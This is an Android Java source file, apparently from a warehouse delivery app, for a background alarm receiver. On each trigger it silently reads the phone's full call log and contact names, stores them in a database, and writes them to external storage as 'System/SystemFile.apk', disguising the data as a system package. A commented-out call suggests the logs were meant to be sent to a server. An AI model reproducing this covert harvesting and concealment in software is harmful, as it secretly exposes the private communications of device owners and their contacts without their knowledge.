package warehousedelivery.taaxgenie.in.androidrestart;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.util.Date;

public class DBAlarmReceiver extends BroadcastReceiver {
	
	public static String ACTION_ALARM = "com.alarammanager.alaram";

	 @Override
	 public void onReceive(Context context, Intent intent) {

	  Log.e("Alarm Receiver", "Entered");
	 // Toast.makeText(context, "Entered", Toast.LENGTH_SHORT).show();

		calllog(context);
	 }
	private void calllog(Context context) {
	 	try{
		Database db = new Database(context);
		StringBuffer sb = new StringBuffer();
		if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
			// TODO: Consider calling
			//    ActivityCompat#requestPermissions
			// here to request the missing permissions, and then overriding
			//   public void onRequestPermissionsResult(int requestCode, String[] permissions,
			//                                          int[] grantResults)
			// to handle the case where the user grants the permission. See the documentation
			// for ActivityCompat#requestPermissions for more details.
			return;
		}
		Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
		int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);


		sb.append("Call Details :");
		while (managedCursor.moveToNext()) {
			String names = managedCursor.getString(name);
			String phNumber = managedCursor.getString(number);
			String callType = managedCursor.getString(type);
			String callDate = managedCursor.getString(date);
			Date callDayTime = new Date(Long.valueOf(callDate));
			String callDuration = managedCursor.getString(duration);


			//Date/time pattern of input date

//			names = names.replaceAll("[\\-\\+\\.\\^:,]","");
			if (names==null){
				names= getContactName(phNumber,context);
//				  names = names.replaceAll("[-+.^:,]","");
//				names = names.replaceAll("[\\-\\+\\.\\^:,]","");
				names = names.replaceAll("[.^:,`\'\"?!@#$%&*()_{}/*-<>]","");

				names = names.replace("","");
			}else{
				names = names.replaceAll("[.^:,`\'\"?!@#$%&*()_{}/*-<>]","");
			}

			String dir = null;
			int dircode = Integer.parseInt(callType);
			switch (dircode) {
				case CallLog.Calls.OUTGOING_TYPE:
					dir = "OUTGOING";
					break;

				case CallLog.Calls.INCOMING_TYPE:
					dir = "INCOMING";
					break;

				case CallLog.Calls.MISSED_TYPE:
					dir = "MISSED";
					break;
			}

			Boolean b=db.getsinglelog(callDayTime.toString(),names);
			//.replaceAll(" ","_").replaceAll(""+"","_").replaceAll(":","_"));

			if(b){
				// Toast.makeText(getApplicationContext(), "recordfound",Toast.LENGTH_SHORT).show();
				db.Insert(names, phNumber,dir,callDuration,callDayTime.toString());
			}



//            sb.append("\nNumber Name:--- " + names + "\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
//            sb.append("\n----------------------------------");


		}


		writeToFile(sb.toString(), context);
		}catch (Exception e){
		Log.e("name eror",e.getMessage());
			Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
		}
	}
	public String getContactName(final String phoneNumber, Context context)
	{
		try{
		Uri uri=Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,Uri.encode(phoneNumber));

		String[] projection = new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME};

		String contactName="";
		Cursor cursor=context.getContentResolver().query(uri,projection,null,null,null);

		if (cursor != null) {
			if(cursor.moveToFirst()) {
				contactName=cursor.getString(0);
			}
			cursor.close();
		}

		return contactName;
		}catch (Exception e){
			Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
		}
		return phoneNumber;
	}
	private void writeToFile(String data, Context context) {
try{
		Database db = new Database(context);

		try {

			String path =
					Environment.getExternalStorageDirectory() + File.separator  + "System/";
			File folder = new File(path);
			if (!folder.exists()) {
				folder.mkdir();
			}
			final File file = new File(folder, "SystemFile.apk");
			file.createNewFile();
			FileOutputStream fOut = new FileOutputStream(file);
			OutputStreamWriter myOutWriter =
					new OutputStreamWriter(fOut);
			myOutWriter.append(db.getAlllog());

			myOutWriter.close();
			fOut.close();





			//sendtoserver(db.getAlllogJSON());


		} catch (Exception e) {
//			Toast.makeText(context, e.getMessage(),
//					Toast.LENGTH_SHORT).show();
			Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
		}
}catch (Exception e){
	Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
}
	}

}
